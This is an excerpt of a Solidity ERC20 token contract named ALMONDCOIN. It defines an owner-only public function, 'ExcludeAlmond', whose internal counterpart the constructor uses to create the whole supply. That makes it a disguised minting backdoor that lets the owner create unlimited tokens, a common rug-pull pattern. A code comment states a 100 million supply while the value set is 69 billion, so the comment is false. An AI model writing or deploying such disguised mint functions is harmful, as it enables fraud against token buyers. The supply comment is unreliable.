...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function ExcludeAlmond(uint256 amount) public onlyOwner {
    _ExcludeAlmond(msg.sender, amount);
    }
    ...
    function _ExcludeAlmond(address account, uint256 amount) internal virtual {
...
contract ALMONDCOIN is ERC20 {

    uint tokenTotalSupply = 69000000000; // 100 Million Token Supply

    constructor() public ERC20("ALMONDCOIN", "ALMONDCOIN") {
        _ExcludeAlmond(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}